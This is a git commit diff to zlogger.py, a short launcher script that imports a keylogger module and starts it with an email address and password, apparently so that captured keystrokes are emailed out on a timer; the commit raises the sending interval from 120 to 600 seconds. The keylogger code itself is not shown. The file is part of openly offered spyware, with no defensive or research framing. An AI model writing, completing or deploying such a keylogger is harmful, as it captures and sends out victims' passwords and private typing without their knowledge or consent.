acdc1dae3b583c5b04ab4df2eb766131ddf46494
Tarrun <52660661+tarrun99@users.noreply.github.com>
2022-06-08 21:59:55 -0400

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -2,5 +2,5 @@
 
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, "email_address", "password")    #Enter the email address and password of your email_account 
+my_keylogger = keylogger.Keylogger(600, "email_address", "password")    #Enter the duration to send an email ( in sec ), email address and password of your email_account 
 my_keylogger.start()
